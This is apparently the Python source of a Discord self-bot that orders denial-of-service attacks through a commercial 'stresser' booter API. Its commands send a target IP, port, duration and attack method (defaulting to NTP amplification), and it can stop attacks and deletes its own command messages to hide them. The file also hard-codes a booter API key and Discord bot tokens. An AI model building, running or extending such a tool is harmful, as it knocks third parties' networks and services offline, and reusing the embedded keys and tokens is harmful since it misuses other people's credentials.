import discord
import requests
import json
import threading
import time
from datetime import datetime, timedelta
from discord.ext.commands import bot
from discord.ext import commands
from typing import List, Optional
from ping3 import ping as pingIP

intents = discord.Intents().all()
bot = commands.Bot(command_prefix='$pk.', intents=intents)
bot.remove_command("help")

''' Basic config info '''
#Token: str = 'Nzg2MDkwMzUyNDY0MzYzNTU4.G8fYya.7oU9MW4hGLNpbP7UN-F0EMylpxKdDplg2wy1Wo'

MaxTime: int = 600
MaxPort: int = 65535

cmds = ['pk.start', 'pk.stop', 'pk.g', 'pk.r', 'pk.m', 'pk.methods', 'pk.addres', 'pk.res', 'pk.ping', 'pk.kill', 'pk.o', 'pk.s', 'pk.h', 'pk.hi', 'pk.db', 'pk.dbnew', 'pk.dbhelp']

''' Pass dynamic inputs with %s '''
class URLS:
    APILink: str = "https://zdstresser.net/panel/apiv1/?userid=18741&key=ADLRW-75726-N7A6J&command="
    GEOIP: str = "http://ip-api.com/json/%s"
    
class HomeConfig:
    Time = 600
    Port = 80
    Method = 'NTP'
''' Stop editing '''

LoopList: List[dict] = []
def LoopFunction():
    try:
        while True:
            time.sleep(1)
            if len(LoopList) > 0:
                for atk in LoopList:
                    atkDate = datetime.strptime(atk['LoopDate'], "%Y-%m-%d %H:%M:%S.%f")
                    if atkDate <= datetime.now():
                        atk['LoopDate'] = str(datetime.now() + timedelta(seconds=atk['Time'] + 15))
                        APILink: str = URLS.APILink % (atk['IP'], atk['Port'], atk['Time'], atk['Method'])
                        APIResponse: dict = requests.post(APILink)
                        if 'sent' in APIResponse.text: print(APIResponse.text)
                        else: print(f"**Unable to send attack ->**  `{APIResponse.text}`") 
    except Exception as e: print(e)

@bot.event 
async def on_ready():
    print("[!] Rebirth-API self-bot | Written by: TCP | Online")

@bot.event
async def on_message(message):
    await bot.process_commands(message)
    if message.content.split(" ")[0].lower() in cmds: await message.delete()

''' Start/Stop commands '''
@bot.command()
async def start(ctx, ip: str = None, port: int = None, time: int = None, method: str = None) -> None:
    if ip and port and time and method != None:
        if 0 < int(port) > MaxPort: ctx.send(f"**Invalid Port:** `{port} | Port must be 1-{MaxPort}`")
        elif 0 < int(time) > MaxTime: ctx.send(f"**Invalid Time:** `{time} | Time must be 1-{MaxTime}`")
        else:
            APILink: str = URLS.APILink % (ip, port, time, method)
            APIResponse: dict = requests.post(APILink)
            if 'sent' in APIResponse.text: await ctx.send(f"`{APIResponse.text.replace('User: mrflawless23', '')}`")
            else: await ctx.send(f"**Unable to send attack ->**  `{APIResponse.text}`") 
    else: await ctx.send(f"**Correct usage:** `pk.start [IP] [Port] [Time] [Method]`")

@bot.command()
async def h(ctx, *args) -> None:
    if len(args) > 0: 
        for ip in args:
            APILink: str = URLS.APILink % (ip, HomeConfig.Port, HomeConfig.Time, HomeConfig.Method)
            APIResponse: dict = requests.post(APILink)
            if 'sent' in APIResponse.text: await ctx.send(f"`{APIResponse.text.replace('User: mrflawless23', '')}`")
            else: await ctx.send(f"**Unable to send attack ->**  `{APIResponse.text}`") 
    else: await ctx.send(f"**Correct usage:** `pk.h [IP]`")

@bot.command()
async def stop(ctx, ip: str = None) -> None:
    if ip != None:
        APILink: str = URLS.APILink % (ip, 1, 1, "STOP")
        APIResponse: dict = requests.post(APILink)
        if 'sent' in APIResponse.text: await ctx.send(f"`{APIResponse.text.replace('User: mrflawless23', '')}`")
        else: await ctx.send(f"**Unable to stop attack ->**  `{APIResponse.text}`") 
    else: await ctx.send(f"**Correct usage:** `pk.stop [IP]`")
''' End of start/stop commands'''

''' Start/Stop loop command '''
#@bot.command()
#async def kill(ctx, option: str = None, ip: str = None, port: Optional[int] = None, time: Optional[int] = None, method: Optional[str] = None) -> None:
#    if option != None:
#        if option.lower() == "add":
#            if ip and port and time and method != None:
#                if 0 < int(port) > MaxPort: ctx.send(f"**Invalid Port:** `{port} | Port must be 1-{MaxPort}`")
#                elif 300 < int(time) > MaxTime: ctx.send(f"**Invalid Time:** `{time} | Loop time must be 300-{MaxTime}`")
#                else:
#                    APILink: str = URLS.APILink % (ip, port, time, method)
#                    APIResponse: dict = requests.post(APILink).json()
#                    if 'sent' in APIResponse.text: 
#                        await ctx.send(f"`{APIResponse.text.replace('User: mrflawless23', '')}`")
#                        AppendData = {'IP': ip, 'Port': port, 'Time': time, 'Method': method, 'LoopDate': str(datetime.now() + timedelta(seconds=(time + 5)))}
#                        LoopList.append(AppendData)
#                    else: 
#                        await ctx.send(f"**Unable to send attack & start loop ->**  `{APIResponse.text}`") 
#            else: await ctx.send(f"**Correct usage:**\n`pk.kill [Add] [IP] [Port] [Time] [Method]`")
#
#        elif option.lower() == "stop":
#            if ip != None:
#                FindLoop = [atk for atk in LoopList if atk['IP'] == ip][0]
#                if len(FindLoop) > 0:
#                    LoopList.remove(FindLoop)
#                    await ctx.send(f"**Removed** __**{ip}**__ **from loop list**")
#                else: print("**Unable to stop IP - IP not found**")
#            else: await ctx.send(f"**Correct usage:**\n`pk.kill [Stop]`")
#    else: await ctx.send(f"**Correct usages:**\n`pk.kill [Add] [IP] [Port] [Time] [Method]`\n`pk.kill [Stop] [IP]`")

#''' Background looping thread '''
#KillLoop = threading.Thread(target=LoopFunction)
#KillLoop.setDaemon(True)
#KillLoop.start()

bot.run("MTIyNzE5OTYwNDA5ODA3MjYyNg.GEOq_G.oebj4UIAbwnuMc8V922H5L174qN9jge9i3mqmI")
